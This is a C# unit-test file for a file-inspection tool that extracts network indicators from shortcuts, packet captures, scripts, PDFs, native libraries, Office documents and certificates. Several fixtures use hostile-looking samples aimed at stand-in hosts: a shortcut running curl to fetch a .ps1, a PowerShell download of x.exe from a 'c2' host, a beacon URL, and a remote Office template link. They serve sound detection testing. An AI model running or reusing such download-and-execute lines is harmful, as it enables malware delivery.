using System.Text;
using Corvus.Core;
using Corvus.Services;
using Corvus.Services.Analysis;

namespace Corvus.Tests;

/// <summary>view=indicators: the observables of every view merged into one list by type and value.</summary>
public sealed class IndicatorTests : IDisposable
{
    private readonly TempDir _dir = new();
    private readonly AssemblyWorkspace _ws = new();
    public void Dispose() { _ws.Dispose(); _dir.Dispose(); }

    private IndicatorFacts List(string name, byte[] bytes)
    {
        var path = _dir.File(name);
        File.WriteAllBytes(path, bytes);
        var summary = new InspectionService(_ws).Summarize(null, path, default, new FileViewOptions("indicators"));
        return (IndicatorFacts)summary.Views["indicators"].Detail;
    }

    private static FileView? Inspect(IFileSummaryView view, string name, byte[] bytes) => view.Inspect(new FileInput(name, bytes, Blob.Identify(bytes)), default);

    [Fact]
    public void A_shortcut_argument_URL_gives_a_url_and_its_host()
    {
        var view = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c curl http://payload.example.net/a.ps1"))!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://payload.example.net/a.ps1", Source: "lnk", Location: "arguments" });
        Assert.Contains(view.Indicators, h => h is { Type: "domain", Value: "payload.example.net" });
    }

    [Fact]
    public void A_shortcut_to_a_local_document_gives_no_indicators()
    {
        var view = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c start invoice.pdf"))!;
        Assert.Empty(view.Indicators);
        Assert.DoesNotContain(view.Findings, f => f.Level == FindingLevel.Noteworthy && f.Rule.StartsWith("indicators", StringComparison.Ordinal));
    }

    [Fact]
    public void A_capture_gives_DNS_names_server_names_and_TLS_fingerprints()
    {
        var list = List("a.pcap", PcapTests.Pcap(PcapTests.EthernetFrames()));
        Assert.Contains(list.Indicators, i => i is { Type: "domain", Value: "api.example.com" });
        Assert.Contains(list.Indicators, i => i is { Type: "ja4", Value: "t12d0103h2_0f2cb44170f4_4298e3b3ed58" });
        Assert.Contains(list.Indicators, i => i.Type == "ja3" && i.Value.Length == 32);
    }

    [Theory]
    [InlineData("api.example.com", "domain")]
    [InlineData("192.0.2.7", "ipv4")]
    [InlineData("2001:db8::1", "ipv6")]
    public void A_server_name_written_as_an_address_is_typed_as_that_address(string host, string type) =>
        Assert.Equal(type, IndicatorList.HostType(host));

    [Fact]
    public void A_host_seen_as_a_DNS_name_and_a_server_name_is_one_row_with_both_places()
    {
        var list = List("a.pcap", PcapTests.Pcap(PcapTests.EthernetFrames()));
        var row = Assert.Single(list.Indicators, i => i is { Type: "domain", Value: "api.example.com" });
        Assert.Equal(["pcap"], row.Sources);
        Assert.Equal("pcap: DNS query", row.FirstLocation);
        Assert.Equal(list.Indicators.Count, list.Total);
    }

    [Fact]
    public void A_script_gives_the_URL_in_its_text()
    {
        var view = Inspect(new ScriptFileView(), "run.ps1", Encoding.UTF8.GetBytes("Invoke-WebRequest -Uri 'http://c2.example.org/x' -OutFile x.exe\n"))!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://c2.example.org/x", Source: "script" });
    }

    [Fact]
    public void A_PDF_URI_action_gives_its_URL()
    {
        var pdf = Encoding.ASCII.GetBytes("%PDF-1.4\n1 0 obj\n<</Type/Catalog/OpenAction 2 0 R>>\nendobj\n2 0 obj\n<</S/URI/URI(http://links.example.com/a)>>\nendobj\n" +
                                          "trailer\n<</Root 1 0 R>>\n%%EOF\n");
        var view = Inspect(new PdfFileView(), "a.pdf", pdf)!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://links.example.com/a", Source: "pdf" });
    }

    [Fact]
    public void A_file_no_view_reads_gives_an_empty_list()
    {
        var list = List("a.bin", [1, 2, 3, 4]);
        Assert.Equal(0, list.Total);
    }

    private static IReadOnlyList<IndicatorHit> NativeHits(params string[] strings)
    {
        var bytes = AndroidDependencyTests.NativeLibrary(strings);
        var input = new FileInput("a.so", bytes, Blob.Identify(bytes)) { Options = new FileViewOptions("indicators") };
        return new NativeFileView().Inspect(input, default)?.Indicators ?? [];
    }

    [Fact]
    public void A_native_image_string_gives_its_URL_and_host_with_the_offset()
    {
        var hits = NativeHits("beacon http://c2.example.org/gate ok");
        Assert.Contains(hits, h => h is { Type: "url", Value: "http://c2.example.org/gate", Source: "native" } && h.Location!.StartsWith("ASCII string at 0x", StringComparison.Ordinal));
        Assert.Contains(hits, h => h is { Type: "domain", Value: "c2.example.org" });
    }

    [Fact]
    public void A_native_image_UTF16_string_gives_its_URL()
    {
        var bytes = AndroidDependencyTests.NativeLibrary();
        bytes = [.. bytes, .. Encoding.Unicode.GetBytes("https://wide.example.net/x"), 0, 0];
        var input = new FileInput("a.so", bytes, Blob.Identify(bytes)) { Options = new FileViewOptions("indicators") };
        var hits = new NativeFileView().Inspect(input, default)!.Indicators;
        Assert.Contains(hits, h => h is { Type: "url", Value: "https://wide.example.net/x" } && h.Location!.StartsWith("UTF-16", StringComparison.Ordinal));
    }

    [Fact]
    public void A_native_image_with_version_and_file_names_gives_no_indicators()
    {
        Assert.Empty(NativeHits("libssl.so.3", "version 1.2.3", "lib/x86_64-linux-gnu/libc.so.6", "OpenSSL 3.0.13 30 Jan 2024", "config.json"));
    }

    [Fact]
    public void A_native_image_is_read_for_indicators_only_when_asked()
    {
        var bytes = AndroidDependencyTests.NativeLibrary("http://c2.example.org/gate");
        Assert.DoesNotContain(new NativeFileView().Inspect(new FileInput("a.so", bytes, Blob.Identify(bytes)), default)?.Indicators ?? [], h => h.Type == "url");
    }

    [Fact]
    public void Random_bytes_give_no_string_indicators_and_no_exception()
    {
        var bytes = new byte[100_000];
        new Random(7).NextBytes(bytes);
        Assert.All(IndicatorList.FromImageStrings("native", bytes, default), h => Assert.Equal("native", h.Source));
    }

    [Fact]
    public void An_Office_external_link_gives_its_URL_and_host()
    {
        var rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://tpl.example.net/t.dotm\" TargetMode=\"External\"/></Relationships>";
        var docx = DocumentFixtures.Ooxml(("word/document.xml", "<w:document/>"u8.ToArray()), ("word/_rels/settings.xml.rels", Encoding.UTF8.GetBytes(rels)));
        var view = Inspect(new OfficeFileView(), "a.docx", docx)!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://tpl.example.net/t.dotm", Source: "office" } && h.Location!.Contains("attachedTemplate link", StringComparison.Ordinal));
        Assert.Contains(view.Indicators, h => h is { Type: "domain", Value: "tpl.example.net" });
    }

    private static CertificateEntry Certificate(string subject, string issuer, bool? ca, bool selfIssued, params string[] urls) =>
        new(0, "a.pem", subject, issuer, "01", DateTime.UnixEpoch, DateTime.UnixEpoch, "RSA 2048", "sha256RSA", "", "", "", [], ca, null, [], [], null, null, urls, selfIssued);

    [Fact]
    public void A_certificate_gives_its_signer_issuer_and_revocation_URLs()
    {
        var hits = IndicatorList.FromCertificates("certificate",
            [Certificate("CN=api.example.com", "CN=Example Issuing CA", false, false, "OCSP http://ocsp.example.com", "CRL http://crl.example.com/ca.crl", "caIssuers http://ca.example.com/ca.cer")], default);
        Assert.Contains(hits, h => h is { Type: "signer", Value: "CN=api.example.com" });
        Assert.Contains(hits, h => h is { Type: "issuer", Value: "CN=Example Issuing CA" });
        Assert.Contains(hits, h => h is { Type: "url", Value: "http://ocsp.example.com", Location: "OCSP URL of certificate #0" });
        Assert.Contains(hits, h => h is { Type: "url", Value: "http://crl.example.com/ca.crl" });
        Assert.Contains(hits, h => h is { Type: "domain", Value: "ca.example.com" });
    }

    [Fact]
    public void Revocation_and_timestamp_hosts_of_the_certificate_infrastructure_are_not_indicators()
    {
        var hits = IndicatorList.FromCertificates("certificate",
            [Certificate("CN=api.example.com", "CN=Example Issuing CA", false, false, "OCSP http://ocsp.digicert.com", "CRL http://crl3.digicert.com/ca.crl",
                "caIssuers http://cacerts.digicert.com/ca.crt", "OCSP http://oneocsp.microsoft.com/ocsp", "timestamp http://timestamp.digicert.com", "caIssuers http://ca.example.com/ca.cer")], default);
        Assert.Equal(["ca.example.com", "http://ca.example.com/ca.cer"], hits.Where(h => h.Type is "url" or "domain").Select(h => h.Value).OrderBy(v => v, StringComparer.Ordinal));
    }

    [Fact]
    public void The_endpoint_and_value_readers_share_one_table_of_benign_hosts()
    {
        Assert.False(Corvus.Services.Analysis.Endpoints.EndpointTemplates.IsLinkUrl("http://crl4.digicert.com/a.crl"));
        Assert.False(Corvus.Services.Analysis.Endpoints.EndpointTemplates.IsLinkUrl("http://tempuri.org/"));
        Assert.Empty(IndicatorList.FromText("text", [("http://tempuri.org/ http://apache.org/", "field")], default));
    }

    [Fact]
    public void A_self_issued_authority_gives_no_signer_and_no_issuer()
    {
        Assert.Empty(IndicatorList.FromCertificates("certificate", [Certificate("CN=Example Root", "CN=Example Root", true, true)], default));
    }

    [Fact]
    public void A_certificate_file_view_lists_the_names_of_its_certificates()
    {
        using var key = System.Security.Cryptography.ECDsa.Create(System.Security.Cryptography.ECCurve.NamedCurves.nistP256);
        var request = new System.Security.Cryptography.X509Certificates.CertificateRequest("CN=build.example.com", key, System.Security.Cryptography.HashAlgorithmName.SHA256);
        using var cert = request.CreateSelfSigned(DateTimeOffset.UnixEpoch, DateTimeOffset.UnixEpoch.AddYears(100));
        var view = Inspect(new CertificateFileView(), "a.pem", Encoding.ASCII.GetBytes(cert.ExportCertificatePem()))!;
        Assert.Contains(view.Indicators, h => h is { Type: "signer", Value: "CN=build.example.com", Source: "certificate" });
        Assert.DoesNotContain(view.Indicators, h => h.Type == "issuer");
    }
}
